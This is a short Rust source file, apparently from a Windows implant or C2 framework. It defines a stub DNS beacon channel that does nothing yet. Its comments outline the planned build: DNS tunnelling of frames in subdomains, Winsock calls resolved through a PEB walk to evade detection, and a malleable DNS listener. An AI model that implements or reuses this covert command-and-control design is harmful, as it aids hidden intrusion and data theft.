//! Native DNS beacon channel — STUB (spec-4 will implement).
//!
//! spec-4 plan: raw UDP DNS queries (A/AAAA/TXT) via ws2_32 FFI (PEB walk),
//! tunnel frame bytes through subdomain encoding. Server-side DNS listener
//! on UDP 53 responds with malleable A/TXT records.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// STUB: returns None + diagnostic marker. spec-4 fills this in.
pub unsafe fn send_recv(_ctx: &ChannelCtx, _frame: &[u8]) -> Option<Vec<u8>> {
    crate::entry::diag_mark(b"ERR_CH_DNS_UNIMPL");
    None
}
